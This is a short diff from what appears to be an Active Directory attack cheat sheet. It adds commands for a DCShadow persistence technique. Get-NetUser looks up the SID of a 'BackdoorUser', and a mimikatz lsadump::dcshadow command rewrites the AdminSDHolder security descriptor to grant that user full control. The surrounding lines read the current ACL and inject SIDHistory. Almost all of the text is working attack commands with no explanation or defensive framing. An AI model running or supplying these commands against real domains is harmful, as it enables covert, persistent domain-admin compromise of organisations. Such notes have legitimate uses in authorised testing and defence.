@@ -880,5 +880,7 @@ lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-28056
 # Requires retrieval of current ACL:
 (New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com")).psbase.ObjectSecurity.sddl
 # Then get target user SID:
-
+Get-NetUser -UserName BackdoorUser | select objectsid
+# Add full control primitive for user
+lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-280565432-1493477821-700767426-345]])
 ```
